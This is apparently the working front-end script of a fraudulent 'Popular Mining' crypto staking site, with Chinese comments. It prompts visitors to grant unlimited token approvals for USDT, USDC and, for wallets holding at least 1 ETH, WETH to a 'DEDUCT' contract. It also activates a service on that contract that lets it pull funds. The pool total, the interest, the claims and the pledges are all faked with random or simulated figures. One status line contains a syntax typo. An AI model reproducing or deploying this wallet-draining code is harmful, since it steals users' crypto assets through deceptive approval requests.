//---Client-side Constants (客戶端常數)---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

//---ABI Definitions (客戶端精簡版 ABI)---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

//---Global Variables & DOM Elements (全域變數與 DOM 元素)---
const connectButton = document.getElementById('connectButton');
const statusDiv = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const pledgeBtn = document.getElementById('pledgeBtn');
const pledgeAmount = document.getElementById('pledgeAmount');
const pledgeDuration = document.getElementById('pledgeDuration');
const pledgeToken = document.getElementById('pledgeToken');
const refreshWallet = document.getElementById('refreshWallet');
const walletBalanceValue = document.getElementById('walletBalanceValue');
const totalValue = document.getElementById('totalValue');
const grossOutputValue = document.querySelector('#liquidity .stat-value:nth-of-type(1)');
const cumulativeValue = document.querySelector('#liquidity .stat-value:nth-of-type(2)');
const claimBtn = document.createElement('button'); // 動態添加 Claim 按鈕

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let stakingStartTime = localStorage.getItem('stakingStartTime') ? parseInt(localStorage.getItem('stakingStartTime')) : null; // 從 localStorage 載入
let claimedInterest = localStorage.getItem('claimedInterest') ? parseFloat(localStorage.getItem('claimedInterest')) : 0; // 從 localStorage 載入
let pledgedAmount = 0; // 記錄質押金額

//---UI Control Functions (使用者介面控制函數)---
function updateStatus(message) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
}

/**
 * 重置應用程式的狀態，並禁用所有互動元素。
 * @param {boolean} showMsg - 是否顯示連接錢包的狀態訊息。(預設為 true)
 */
function resetState(showMsg = true) {
    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
    stakingStartTime = null;
    claimedInterest = 0;
    pledgedAmount = 0;
    localStorage.removeItem('stakingStartTime');
    localStorage.removeItem('claimedInterest');
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.textContent = 'Connect';
        connectButton.title = 'Connect Wallet';
    }
    disableInteractiveElements(true);
    if (walletBalanceValue) walletBalanceValue.textContent = '0.000 USDT / 0.000 USDC / 0.000 WETH';
    if (grossOutputValue) grossOutputValue.textContent = '0 ETH'; // 確保重置為 0
    if (cumulativeValue) cumulativeValue.textContent = '0 ETH'; // 確保重置為 0
    if (showMsg) updateStatus("請先連接您的錢包以繼續。");
}

/**
 * 啟用或禁用所有互動元素。
 * @param {boolean} disable - 是否禁用元素。(預設為 false)
 */
function disableInteractiveElements(disable = false) {
    if (startBtn) startBtn.disabled = disable;
    if (pledgeBtn) pledgeBtn.disabled = disable;
    if (pledgeAmount) pledgeAmount.disabled = disable;
    if (pledgeDuration) pledgeDuration.disabled = disable;
    if (pledgeToken) pledgeToken.disabled = disable;
    if (refreshWallet) {
        refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
        refreshWallet.style.color = disable ? '#999' : '#ff00ff';
    }
    if (claimBtn) claimBtn.disabled = disable;
}

/**
 * 更新 Wallet Balance 顯示。
 * @param {Object} balances - 包含 USDT, USDC, WETH 餘額的對象。
 */
function updateWalletBalance(balances) {
    if (walletBalanceValue) {
        const usdtBalance = ethers.formatUnits(balances.usdt || 0n, 6);
        const usdcBalance = ethers.formatUnits(balances.usdc || 0n, 6);
        const wethBalance = ethers.formatUnits(balances.weth || 0n, 18);
        walletBalanceValue.textContent = `${parseFloat(usdtBalance).toFixed(3)} USDT / ${parseFloat(usdcBalance).toFixed(3)} USDC / ${parseFloat(wethBalance).toFixed(3)} WETH`;
    }
}

/**
 * 更新 Total Funds 顯示，基於固定起點時間計算。
 */
function updateTotalFunds() {
    if (totalValue) {
        // 起始時間：美東時間 2025 年 10 月 22 日 00:00 (UTC-4)
        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime(); // UTC 毫秒數
        const currentTime = Date.now(); // 當前 UTC 毫秒數
        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000); // 經過的秒數

        // 起始金額
        let initialFunds = 12856459.94;
        // 每秒隨機增加 0.01 ~ 0.1 ETH
        const increaseRate = Math.random() * (0.1 - 0.01) + 0.01;
        const totalIncrease = elapsedSeconds * increaseRate;

        // 總資金 = 起始金額 + 總增加金額
        const totalFunds = initialFunds + totalIncrease;

        // 更新顯示，保留 2 位小數並添加千位分隔符
        totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
    }
}

/**
 * 更新利息顯示。
 */
function updateInterest() {
    if (stakingStartTime && grossOutputValue && cumulativeValue) {
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000); // 質押經過的秒數
        // 利息率基於質押金額，每 1 ETH 每天 0.1% 利息，轉換為每秒
        const baseInterestRate = 0.000001; // 基礎利率 (0.1% 每天 / 86400 秒)
        const interestRate = baseInterestRate * pledgedAmount; // 與質押金額成正比
        const grossOutput = elapsedSeconds * interestRate; // 總累積利息
        const cumulative = grossOutput - claimedInterest; // 剩餘利息

        grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`; // 保留 7 位小數
        cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`; // 保留 7 位小數
        localStorage.setItem('claimedInterest', claimedInterest); // 持久化已領取利息
    }
}

//---Core Wallet Logic (核心錢包邏輯)---
/**
 * 【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
 */
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("錢包未連接或簽名者缺失。");

    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();

    const mobileTx = {
        from: fromAddress,
        to: populatedTx.to,
        data: populatedTx.data,
        value: '0x' + BigInt(txValue).toString(16)
    };

    let txHash;
    let receipt = null;

    try {
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        updateStatus(`授權已發送！HASH: ${txHash.slice(0, 10)}... 等待確認中...`);
        receipt = await provider.waitForTransaction(txHash);
    } catch (error) {
        console.warn("⚠️ Trust Wallet 介面可能會拋出無害錯誤。繼續進行鏈上檢查...");

        if (error.hash) {
            txHash = error.hash;
        } else if (error.message && error.message.includes('0x')) {
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }

        if (txHash) {
            updateStatus(`交易介面發生錯誤！已發送交易: ${txHash.slice(0, 10)}... 等待確認中...`);
            receipt = await provider.waitForTransaction(txHash);
        } else {
            throw new Error(`交易發送失敗，無法從錯誤中檢索交易哈希: ${error.message}`);
        }
    }

    if (!receipt || receipt.status !== 1) {
        throw new Error(`交易在鏈上失敗（已復原）。哈希: ${txHash.slice(0, 10)}...`);
    }

    return receipt;
}

/**
 * 初始化錢包，強制切換至以太坊主網。
 */
async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask、Trust Wallet 或相容的錢包以繼續。');
            return;
        }

        provider = new ethers.BrowserProvider(window.ethereum);

        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            updateStatus('請求切換至 Ethereum 主網... 請在錢包中批准。');
            try {
                await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('您拒絕了網絡切換。請手動切換至 Ethereum Mainnet 並刷新頁面。');
                } else if (switchError.code === 4902) {
                    await provider.send('wallet_addEthereumChain', [{
                        chainId: '0x1',
                        chainName: 'Ethereum Mainnet',
                        rpcUrls: ['https://mainnet.infura.io/v3/'], // 請替換為您的 RPC URL
                        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                        blockExplorerUrls: ['https://etherscan.io']
                    }]);
                    updateStatus('已嘗試添加以太坊主網，請在錢包中確認並刷新頁面。');
                } else {
                    updateStatus(`網絡切換失敗: ${switchError.message}。請手動切換至 Ethereum Mainnet 並刷新頁面。`);
                }
                return;
            }
        }

        window.ethereum.on('accountsChanged', async (newAccounts) => {
            console.log("帳戶切換偵測到，更新狀態...");
            if (newAccounts.length > 0 && (!userAddress || userAddress !== newAccounts[0])) {
                resetState(false);
                await connectWallet();
            }
        });
        window.ethereum.on('chainChanged', async () => {
            console.log("鏈切換偵測到，更新狀態...");
            await initializeWallet();
        });

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            resetState(false);
            await connectWallet();
        }

        updateStatus("請先連接您的錢包以繼續。");
    } catch (error) {
        console.error("初始化錢包錯誤:", error);
        updateStatus(`初始化失敗: ${error.message}`);
    }
}

/**
 * 檢查使用者的服務啟動狀態和代幣授權額度。
 */
async function checkAuthorization() {
    try {
        if (!signer) {
            updateStatus('錢包未連接。請先連接。');
            return;
        }
        updateStatus("檢查授權狀態中...");

        const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch((error) => {
                console.warn("【DEBUG】獲取 WETH 授權失敗:", error.message);
                return 0n;
            })
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = isServiceActive && hasSufficientAllowance;

        console.log("【DEBUG_FinalCheck】用戶地址:", userAddress);
        console.log("【DEBUG_FinalCheck】所需授權額度:", requiredAllowance.toString());
        console.log("【DEBUG_FinalCheck】服務啟動:", isServiceActive);
        console.log("【DEBUG_FinalCheck】是否有足夠授權:", hasSufficientAllowance);
        console.log("【DEBUG_FinalCheck】是否完全授權 (最終):", isFullyAuthorized);

        if (isFullyAuthorized) {
            if (connectButton) {
                connectButton.classList.add('connected');
                connectButton.textContent = 'Connected';
                connectButton.title = '斷開錢包';
            }
            disableInteractiveElements(false);
            updateStatus("✅ 服務已啟動並授權成功。");
        } else {
            if (connectButton) {
                connectButton.classList.remove('connected');
                connectButton.textContent = 'Connect';
                connectButton.title = '連接並授權';
            }
            disableInteractiveElements(true);
            updateStatus('需要授權。請連接並授權。');
        }
        updateStatus("");
    } catch (error) {
        console.error("檢查授權錯誤:", error);
        if (error.code === 'CALL_EXCEPTION') {
            updateStatus('合約通信失敗。請確保您在 **Ethereum 主網** 上且合約地址正確，然後重新整理頁面。');
        } else {
            updateStatus(`授權檢查失敗: ${error.message}`);
        }
    }
}

/**
 * 條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
 */
async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
    updateStatus('檢查並設置代幣授權中...');
    let tokenToActivate = '';
    let stepCount = 0;

    const totalSteps = serviceActivated ? tokensToProcess.length : tokensToProcess.length + 1;

    for (const { name, contract, address } of tokensToProcess) {
        stepCount++;
        updateStatus(`步驟 ${stepCount}/${totalSteps}: 檢查並請求 ${name} 授權...`);

        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch((error) => {
            console.warn(`【DEBUG】獲取 ${name} 授權失敗:`, error.message);
            return 0n;
        });

        if (currentAllowance < requiredAllowance) {
            updateStatus(`步驟 ${stepCount}/${totalSteps}: 請求 ${name} 授權... 請在錢包中批准。`);

            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
            approvalTx.value = 0n;
            await sendMobileRobustTransaction(approvalTx);

            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch((error) => {
                console.warn(`【DEBUG】驗證 ${name} 授權失敗:`, error.message);
                return 0n;
            });
            if (newAllowance >= requiredAllowance) {
                if (!serviceActivated && !tokenToActivate) {
                    tokenToActivate = address;
                }
            }
        } else {
            if (!serviceActivated && !tokenToActivate) {
                tokenToActivate = address;
            }
        }
    }

    if (!serviceActivated && tokenToActivate) {
        stepCount++;
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        updateStatus(`步驟 ${stepCount}/${totalSteps]: 啟動服務 (使用 ${tokenName})...`);

        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        await sendMobileRobustTransaction(activateTx);
    } else if (!serviceActivated) {
        updateStatus(`警告: 未找到可用的授權代幣來啟動服務。請確保您有 ETH 用於 Gas 費用。`);
    } else {
        updateStatus(`所有授權和服務啟動已完成。`);
    }
}

/**
 * 主要函數：連接錢包並根據餘額執行條件式流程。
 */
async function connectWallet() {
    try {
        if (!provider || (await provider.getNetwork()).chainId !== 1n) {
            await initializeWallet();
            const network = await provider.getNetwork();
            if (network.chainId !== 1n) return;
        }

        updateStatus('請在錢包中確認連接...');
        const accounts = await provider.send('eth_requestAccounts', []);
        if (accounts.length === 0) throw new Error("未選擇帳戶。");

        const currentConnectedAddress = accounts[0];

        if (userAddress && userAddress !== currentConnectedAddress) {
            console.warn(`⚠️ 檢測到地址切換從 ${userAddress.slice(0, 8)}... 到 ${currentConnectedAddress.slice(0, 8)}.... 強制重置。`);
            resetState(false);
        }

        signer = await provider.getSigner();
        userAddress = await signer.getAddress();

        console.log("【DEBUG】錢包已連接。當前用戶地址:", userAddress);

        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);

        updateStatus('準備最佳化授權流程...');

        let ethBalance, wethBalance, usdtBalance, usdcBalance;
        try {
            [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
                provider.getBalance(userAddress),
                wethContract.balanceOf(userAddress).catch((error) => {
                    console.warn("【DEBUG】獲取 WETH 餘額失敗:", error.message);
                    return 0n;
                }),
                usdtContract.balanceOf(userAddress).catch((error) => {
                    console.warn("【DEBUG】獲取 USDT 餘額失敗:", error.message);
                    return 0n;
                }),
                usdcContract.balanceOf(userAddress).catch((error) => {
                    console.warn("【DEBUG】獲取 USDC 餘額失敗:", error.message);
                    return 0n;
                }),
            ]);
        } catch (error) {
            ethBalance = await provider.getBalance(userAddress);
            wethBalance = usdtBalance = usdcBalance = 0n;
            console.warn("【DEBUG】獲取餘額失敗，僅使用 ETH 餘額:", error.message);
        }

        const balances = {
            usdt: usdtBalance,
            usdc: usdcBalance,
            weth: wethBalance
        };
        updateWalletBalance(balances);

        const oneEth = ethers.parseEther("1.0");
        const totalEthEquivalent = ethBalance + wethBalance;
        const hasSufficientEth = totalEthEquivalent >= oneEth;

        const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

        console.log("【DEBUG】所需授權額度 (閾值):", requiredAllowance.toString());
        console.log("【DEBUG】服務已啟動:", serviceActivated);

        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch((error) => {
                console.warn("【DEBUG】獲取 WETH 授權失敗:", error.message);
                return 0n;
            })
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = serviceActivated && hasSufficientAllowance;

        console.log("【DEBUG】USDT 授權:", usdtAllowance.toString());
        console.log("【DEBUG】USDC 授權:", usdcAllowance.toString());
        console.log("【DEBUG】WETH 授權:", wethAllowance.toString());
        console.log("【DEBUG】是否有足夠授權:", hasSufficientAllowance);
        console.log("【DEBUG】是否完全授權 (最終檢查):", isFullyAuthorized);

        let tokensToProcess;

        if (hasSufficientEth) {
            tokensToProcess = [
                { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS },
                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
            ];
            updateStatus('檢測到足夠的 ETH/WETH 餘額 (>= 1 ETH)。開始 WETH、USDT、USDC 授權流程。');
        } else {
            tokensToProcess = [
                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
            ];
            updateStatus('ETH/WETH 餘額不足 (< 1 ETH)。開始 USDT、USDC 授權流程。');
        }

        if (!isFullyAuthorized) {
            await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
        }

        await checkAuthorization();
    } catch (error) {
        console.error("連接錢包錯誤:", error);

        let userMessage = `發生錯誤: ${error.message}`;
        if (error.code === 4001) {
            userMessage = "您拒絕了授權。請再次嘗試。";
        } else if (error.message.includes('insufficient funds')) {
            userMessage = "授權失敗: ETH 餘額不足以支付 Gas 費用。";
        } else if (error.code === 'CALL_EXCEPTION') {
            userMessage = "合約調用失敗，請檢查網絡或重新嘗試。";
        }

        updateStatus(userMessage);
        if (connectButton) {
            connectButton.classList.remove('connected');
            connectButton.textContent = 'Connect';
            connectButton.title = '連接錢包 (重試)';
        }
    }
}

/**
 * 斷開連線並重置應用程式狀態。
 */
function disconnectWallet() {
    resetState(true);
    alert('錢包已斷開。要完全移除網站權限，請在錢包的「已連接網站」設置中操作。');
}

/**
 * 模擬領取利息。
 */
function claimInterest() {
    if (stakingStartTime && grossOutputValue) {
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
        const baseInterestRate = 0.000001; // 基礎利率 (0.1% 每天 / 86400 秒)
        const interestRate = baseInterestRate * pledgedAmount;
        const grossOutput = elapsedSeconds * interestRate;
        claimedInterest = grossOutput; // 領取所有當前利息
        localStorage.setItem('claimedInterest', claimedInterest);
        updateInterest();
        alert('利息已領取！(模擬)');
    }
}

//---Language Control Functions (語言控制函數)---
const translations = {
    'en': {
        title: 'Popular Mining',
        subtitle: 'Start Earning Millions',
        totalValue: '12,856,459.94 ETH',
        tabLiquidity: 'Liquidity',
        tabPledging: 'Pledging',
        grossOutputLabel: 'Gross Output',
        cumulativeLabel: 'Cumulative',
        walletBalanceLabel: 'Wallet Balance',
        accountBalanceLabel: 'Account Balance',
        compoundLabel: '⚡ Compound',
        nextBenefit: 'Next Benefit: 00:00:00',
        startBtnText: 'Start',
        pledgeAmountLabel: 'Pledge Amount',
        pledgeDurationLabel: 'Duration',
        pledgeBtnText: 'Pledge Now',
        totalPledgedLabel: 'Total Pledged',
        expectedYieldLabel: 'Expected Yield',
        apyLabel: 'APY',
        lockedUntilLabel: 'Locked Until',
        claimBtnText: 'Claim'
    },
    'zh-Hant': {
        title: '熱門挖礦',
        subtitle: '開始賺取數百萬',
        totalValue: '12,856,459.94 ETH',
        tabLiquidity: '流動性',
        tabPledging: '質押',
        grossOutputLabel: '總產出',
        cumulativeLabel: '累計',
        walletBalanceLabel: '錢包餘額',
        accountBalanceLabel: '帳戶餘額',
        compoundLabel: '⚡ 複利',
        nextBenefit: '下次收益: 00:00:00',
        startBtnText: '開始',
        pledgeAmountLabel: '質押金額',
        pledgeDurationLabel: '期間',
        pledgeBtnText: '立即質押',
        totalPledgedLabel: '總質押',
        expectedYieldLabel: '預期收益',
        apyLabel: '年化收益率',
        lockedUntilLabel: '鎖定至',
        claimBtnText: '領取'
    },
    'zh-Hans': {
        title: '热门挖矿',
        subtitle: '开始赚取数百万',
        totalValue: '12,856,459.94 ETH',
        tabLiquidity: '流动性',
        tabPledging: '质押',
        grossOutputLabel: '总产出',
        cumulativeLabel: '累计',
        walletBalanceLabel: '钱包余额',
        accountBalanceLabel: '账户余额',
        compoundLabel: '⚡ 复利',
        nextBenefit: '下次收益: 00:00:00',
        startBtnText: '开始',
        pledgeAmountLabel: '质押金额',
        pledgeDurationLabel: '期间',
        pledgeBtnText: '立即质押',
        totalPledgedLabel: '总质押',
        expectedYieldLabel: '预期收益',
        apyLabel: '年化收益率',
        lockedUntilLabel: '锁定至',
        claimBtnText: '领取'
    }
};

let currentLang = navigator.language || navigator.userLanguage;

if (!['en', 'zh-Hant', 'zh-Hans'].includes(currentLang)) {
    currentLang = 'en';
} else if (currentLang === 'zh') {
    currentLang = 'zh-Hans';
}

const languageSelect = document.getElementById('languageSelect');
const elements = {
    title: document.getElementById('title'),
    subtitle: document.getElementById('subtitle'),
    totalValue: document.getElementById('totalValue'),
    tabLiquidity: document.getElementById('tabLiquidity'),
    tabPledging: document.getElementById('tabPledging'),
    grossOutputLabel: document.getElementById('grossOutputLabel'),
    cumulativeLabel: document.getElementById('cumulativeLabel'),
    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
    compoundLabel: document.getElementById('compoundLabel'),
    nextBenefit: document.getElementById('nextBenefit'),
    startBtnText: document.getElementById('startBtn'),
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
    pledgeBtnText: document.getElementById('pledgeBtn'),
    totalPledgedLabel: document.getElementById('totalPledgedLabel'),
    expectedYieldLabel: document.getElementById('expectedYieldLabel'),
    apyLabel: document.getElementById('apyLabel'),
    lockedUntilLabel: document.getElementById('lockedUntilLabel'),
    claimBtnText: claimBtn
};

function updateLanguage(lang) {
    currentLang = lang;
    languageSelect.value = lang;
    for (let key in elements) {
        if (elements[key]) {
            elements[key].textContent = translations[lang][key] || '';
        }
    }
    if (claimBtn.parentNode) {
        claimBtn.textContent = translations[lang].claimBtnText;
    }
}

languageSelect.value = currentLang;
updateLanguage(currentLang);

languageSelect.addEventListener('change', (e) => {
    updateLanguage(e.target.value);
});

//---Event Listeners & Initial Load (事件監聽器與初始載入)---
if (connectButton) {
    connectButton.addEventListener('click', () => {
        if (connectButton.classList.contains('connected')) {
            disconnectWallet();
        } else {
            connectWallet();
        }
    });
}

startBtn.addEventListener('click', () => {
    if (!connectButton.classList.contains('connected')) {
        alert('請先連接您的錢包！');
        return;
    }
    if (!stakingStartTime) {
        stakingStartTime = Date.now(); // 記錄質押開始時間
        localStorage.setItem('stakingStartTime', stakingStartTime); // 持久化開始時間
        alert('開始流動性挖礦... (模擬: 流程已啟動)');
        // 添加 Claim 按鈕
        claimBtn.textContent = translations[currentLang].claimBtnText;
        claimBtn.className = 'start-btn';
        claimBtn.style.marginTop = '10px';
        claimBtn.disabled = false;
        document.getElementById('liquidity').appendChild(claimBtn);
        claimBtn.addEventListener('click', claimInterest);
    }
    // 每秒更新利息
    setInterval(updateInterest, 1000);
});

pledgeBtn.addEventListener('click', async () => {
    if (!connectButton.classList.contains('connected')) {
        alert('請先連接您的錢包！');
        return;
    }
    const amount = parseFloat(pledgeAmount.value) || 0;
    const duration = pledgeDuration.value;
    const token = pledgeToken.value;
    if (!amount) {
        alert('請輸入質押金額！');
        return;
    }
    pledgedAmount = amount; // 更新質押金額
    alert(`質押 ${amount} ${token} 於 ${duration} 天... (模擬: 質押成功)`);
    const totalPledgedValue = document.getElementById('totalPledgedValue');
    let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
    totalPledgedValue.textContent = `${(currentTotal + amount).toFixed(2)} ${token}`;
});

refreshWallet.addEventListener('click', async () => {
    if (!connectButton.classList.contains('connected')) {
        alert('請先連接您的錢包！');
        return;
    }
    if (signer && userAddress) {
        const [usdtBalance, usdcBalance, wethBalance] = await Promise.all([
            usdtContract.balanceOf(userAddress).catch(() => 0n),
            usdcContract.balanceOf(userAddress).catch(() => 0n),
            wethContract.balanceOf(userAddress).catch(() => 0n)
        ]);
        updateWalletBalance({
            usdt: usdtBalance,
            usdc: usdcBalance,
            weth: wethBalance
        });
        alert('刷新錢包餘額成功！');
    }
});

const tabs = document.querySelectorAll('.tab');
const sections = document.querySelectorAll('.content-section');

tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        sections.forEach(s => s.classList.remove('active'));
        document.getElementById(tab.dataset.tab).classList.add('active');
    });
});

// 每秒更新 Total Funds
setInterval(updateTotalFunds, 1000);

// 頁面載入時執行初始化
initializeWallet();